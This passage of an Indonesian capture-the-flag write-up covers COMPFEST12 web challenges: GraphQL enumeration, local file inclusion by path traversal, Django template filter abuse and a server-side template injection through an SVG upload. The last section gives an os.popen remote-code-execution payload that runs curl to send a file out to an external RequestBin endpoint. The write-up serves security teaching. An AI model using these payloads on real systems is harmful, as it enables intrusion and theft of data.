Setelah beberapa reccon, didapati terdapat 2 buah field, yaitu games dan developer yang mungkin didalamnya terdapat flag. Lalu, lihat data dalam games dengan query berikut.

```graphql
query { 
    games { id,name,developer { id,name } } 
} 
```

Didapati data berikut ini. Terlihat pada games yang memiliki id 7, bernama `TOP SECRET` yang mungkin didalamnya terdapat flag. Sempat submit nama developer (caesar decoded), tetapi masih salah.

```json
{
    "data": {
        "games": [
            ...
            {
                "id": "7",
                "name": "TOP SECRET",
                "developer": {
                    "id": "Do you think it would be that easy?",
                    "name": "dlyrddru_uqzbir_dlqrbz"
                }
            }
        ]
    }
}
```

Lihat `id` dari `developer` "dlyrddru_uqzbir_dlqrbz".

```graphql
query { 
    developer(name : "dlyrddru_uqzbir_dlqrbz") { id } 
}
```

Flag didapatkan.

```json
{
    "data": {
        "developer": {
            "id": "COMPFEST12{c0nv3n1Ence_i5_A_d0ubL3_eDged_SwoRD!}"
        }
    }
}
```

### FLAG

`COMPFEST12{c0nv3n1Ence_i5_A_d0ubL3_eDged_SwoRD!}`\
<br/>

## 6. NERA [397pts]

Local File Inclusion, dengan membaca file `ddududdudu.php` pada `../../../../var/www/html/ddududdudu.php`. Lihat source, file tersebut meng-include file `header.php`

Dimana terdapat clue flag terdapat pada head tag dan kemungkinan `header.php` berisi content dari tag head.

```html
<head>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
    <link rel="stylesheet" href="style.css">
    <!-- Flagnya ada di sini =>  <= yaah ga keliatan... -->
</head>
```

Baca file `header.php` dan lihat sourcenya, didapatkan letak flag.

```html
<head>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
    <link rel="stylesheet" href="style.css">
    <!-- Flagnya ada di sini => <?php include 'flag-c1ae46a42693a5d535052015f2ddaf53.php' ?> <= yaah ga keliatan... -->
</head>
```

Baca `flag-c1ae46a42693a5d535052015f2ddaf53.php` dan didapatkan flag.

```html
<?php
$flag = 'COMPFEST12{lOc4l_fiLe_inClusion_f0r_FUN_and_profit_35c28478ab}';
</pre>
```

### FLAG

`COMPFEST12{lOc4l_fiLe_inClusion_f0r_FUN_and_profit_35c28478ab}`\
<br/>

## 7. Super Secure Filter [280pts]

Input asal untuk mentriger error `{%raw%}{{ 4 }}{%endraw%}` untuk mengecek apakah debug dihidupkan. Dan ternyata benar debug hidup.

Error dibagian `/code/myapp/views.py in homepage` terdapat sesuatu yang mencurigakan, yaitu terdapat request context `arthropods` yang memiliki `other`.

```py
context = RequestContext(request, {
        'arthropods':other,
        'mammals':'<img src="/static/kucing.jpeg" alt="mammalians" id="kucing" style="width:500px">',
        'pisces':'<img src="/static/ikan.jpeg" alt="piscesians" id="ikan" style="width:500px">',
```

Dan terdapat filter `safe` yang kurang baik.

```py    
data = request.POST.get('data', '')
a = angkabukan(''.join(data.split()[1:-1]))
...
template = Template(TEMP.format( "{%raw%}{{ " + data.split()[1].replace('mammals', 'mammals|safe').replace('pisces', 'pisces|safe').replace('amfibi', 'amfibi|safe') + "|safe }}{%endraw%}" + a))
```

Didapatkan juga fungsi-fungsi yang mempermudah untuk mendapatkan flag, yaitu error pada `/code/myapp/templatetags/myfilters.py`.

```py
@register.filter(name='ambildong')
def ambildong(a, b):
    return getattr(a, b)
@register.filter(name='angkabukan')
def angkabukan(a):
    return cobacek(a) …
@register.filter(name='isinya')
def isinya(a):
    return dir(a)
def cobacek(a):
    try:
        a = int(a)
        assert a>0,"woi masa negatif ah yang bener dong"
        assert a<4,"woi udah dibilang jangan lebih dari 3" …
        temp = ['{%raw%}{{ mammals|safe }}{%endraw%}', '{%raw%}{{ pisces|safe }}{%endraw%}','{%raw%}{{ amfibi|safe }}{%endraw%}']
        lst = sample(temp, a)
        return ''.join(lst)
    except ValueError:
        return a
    ...
```

Dengan memanfaatkan fungsi `isinya` yaitu dengan payload `{%raw%}{{ arthropods|isinya }}{%endraw%}`, akan mendapatkan list dir dari `arthropods`.

```py
['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__']arthropods|isinya
```

Lalu, manfaatkan fungsi `ambildong` untuk memanggil dir dari `arthropods` yang ditemukan flag pada dir `__doc__`. Payload akhir: `{%raw%}{{ arthropods|ambildong:"__doc__" }}{%endraw%}`

```py
COMPFEST12{djan90_cu5t0m_t3mplat3_f1Lters_d0nt_forg3t_t0_set_debu9_fal5e}
arthropods|ambildong:"__doc__"
```

### Flag

`COMPFEST12{djan90_cu5t0m_t3mplat3_f1Lters_d0nt_forg3t_t0_set_debu9_fal5e}`\
<br/>


## 8. Bad Parser Bad Templater [486pts]

Disediakan website yang hanya memiliki fitur upload file svg. Mencoba upload file svg kosong yang valid. Didapati response source sebagai berikut.

```html
..[snip]..
image None
..[snip]..
```

Template Injection, dengan menambahkan `{%raw%}{{ 2\*2 }}{%endraw%}` pada svg file.

```html
..[snip]..
image 4
..[snip]..
```

Selanjutnya dilakukan template injection dengan menggunakan fungsi dari os module python yaitu `os.popen()` untuk mendapatkan RCE.

```html
<svg>
    <image>{%raw%}{{ config.__class__.__init__.__globals__['os'].popen('ls -la /').read() }}{%endraw%}</image>
</svg>
```

Sebelumnya menggunakan `[]` dll, tetapi gagal `(Internal Server Error)`. Dan mencari-cari payload diinternet, didapatkan menggunakan `config` dan berhasil.

```sh
..[snip]..image total 84
drwxr-xr-x   1 root root 4096 Aug 28 02:18 .
drwxr-xr-x   1 root root 4096 Aug 28 02:18 ..
-rwxr-xr-x   1 root root    0 Aug 28 02:18 .dockerenv
drwxr-xr-x   1 root root 4096 Aug 28 02:00 app
drwxr-xr-x   1 root root 4096 Aug  4 23:27 bin
drwxr-xr-x   2 root root 4096 Jul 10 21:04 boot
drwxrwxr-x   3 ctf  ctf  4096 Aug 28 01:02 code
drwxr-xr-x   5 root root  340 Aug 28 02:21 dev
drwxr-xr-x   1 root root 4096 Aug 28 02:18 etc
drwxr-xr-x   1 root root 4096 Aug 28 02:00 home
drwxr-xr-x   1 root root 4096 Aug  4 23:27 lib
drwxr-xr-x   2 root root 4096 Aug  3 07:00 lib64
-rw-rw-r--   1 root root   40 Aug 25 03:20 loooool_ini_lho_fl4gnya
drwxr-xr-x   2 root root 4096 Aug  3 07:00 media
drwxr-xr-x   2 root root 4096 Aug  3 07:00 mnt
drwxr-xr-x   2 root root 4096 Aug  3 07:00 opt
dr-xr-xr-x 505 root root    0 Aug 28 02:21 proc
drwx------   1 root root 4096 Aug 28 02:00 root
drwxr-xr-x   3 root root 4096 Aug  3 07:00 run
drwxr-xr-x   1 root root 4096 Aug  4 23:26 sbin
drwxr-xr-x   2 root root 4096 Aug  3 07:00 srv
dr-xr-xr-x  13 root root    0 Aug 28 02:21 sys
drwxrwxrwt   1 root root 4096 Aug 28 03:43 tmp
drwxr-xr-x   1 root root 4096 Aug  3 07:00 usr
drwxr-xr-x   1 root root 4096 Aug  3 07:00 var
..[snip]..
```

Mencoba `cat /loooool_ini_lho_fl4gnya` didapati website `Internal Server Error`. Ternyata kita tidak bisa stdout pada website. Lalu, dilakukan upload file flag ke server. Pertama, dengan membuat endpoint requests dahulu (saya menggunakan RequestsBin).

Setelah itu, upload file flag menggunakan `curl` dari server, berikut final payloadnya.

```html
<svg>
    <image>{%raw%}{{ config.__class__.__init__.__globals__['os'].popen('curl [URL_ENDPOINT] --upload-file /loooool_ini_lho_fl4gnya').read() }}{%endraw%}</image>
</svg>
```

Setelah berhasil, cek pada RequestBin dan didapatkan flag.

![FLAG](https://abdullahnz.github.io/assets/images/WEB-8.png)

### Flag

`COMPFEST12{u_r_the_real_mvp_x0x0_uWWWu}`\
<br/>

**Source File & Solver:** [https://github.com/abdullahnz/CTFan/tree/master/Compfest12](https://github.com/abdullahnz/CTFan/tree/master/Compfest12)
